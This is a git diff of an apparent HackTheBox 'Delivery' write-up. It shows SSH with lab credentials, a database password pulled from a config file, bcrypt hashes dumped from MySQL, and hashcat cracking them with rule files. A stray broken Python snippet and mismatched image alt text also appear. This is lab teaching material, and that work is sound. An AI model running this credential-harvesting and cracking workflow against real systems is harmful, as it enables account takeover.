@@ -33,7 +33,7 @@ Delivery is a quick and fun easy box where we have to create a MatterMost accoun
 
 <script id="asciicast-Wbp70uUvkGrIZJoIH33Jez6kS" src="https://asciinema.org/a/Wbp70uUvkGrIZJoIH33Jez6kS.js" async></script>
 
-{% include codeHeader.html %}
+
 ```python
 defmax (n1, n2):
   if n1 < n2:
@@ -45,7 +45,8 @@ defmax (n1, n2):
 print(max(100, 50))
 ```
 
-{% include codeHeader.html %}
+Now we'll do a tcp scan with Nmap
+
 ```php
 Nmap scan report for 10.129.148.141
 Host is up (0.018s latency).
@@ -99,7 +100,13 @@ The Delivery website is pretty basic, there's a link to a vhost called helpdesk.
 
 The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.
 
-![](/assets/images/htb-writeup-delivery/website2.png)
+<a href="/assets/images/htb-writeup-delivery/website2.png">
+    <img 
+        src="/assets/images/htb-writeup-delivery/website2.png" 
+        alt="Ancient Bristlecone Pine Forest, USA"
+    >
+</a>
+
 
 Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet
 
@@ -153,7 +160,7 @@ With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the
 
 After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:
 
-{% include codeHeader.html %}
+
 ```bash
 maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
 matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
@@ -161,7 +168,7 @@ matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost
 
 The `config.json` file contains the password for the MySQL database:
 
-{% include codeHeader.html %}
+
 ```bash
 [...]
 "SqlSettings": {
@@ -172,7 +179,7 @@ The `config.json` file contains the password for the MySQL database:
 
 We'll connect to the database server and poke around.
 
-{% include codeHeader.html %}
+
 ```bash
 maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -194,7 +201,7 @@ MariaDB [(none)]> show databases;
 
 MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.
 
-{% include codeHeader.html %}
+
 ```bash
 MariaDB [(none)]> use mattermost;
 Reading table information for completion of table and column names
@@ -223,7 +230,7 @@ There was a hint earlier that some variation of `PleaseSubscribe!` is used.
 
 I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.
 
-{% include codeHeader.html %}
+
 ```bash
 C:\bin\hashcat>hashcat --help | findstr bcrypt
    3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
@@ -235,7 +242,7 @@ My go-to rules is normally one of those two ruleset:
 - <https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule>
 
 These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`
-{% include codeHeader.html %}
+
 ```bash
 C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
 [...]
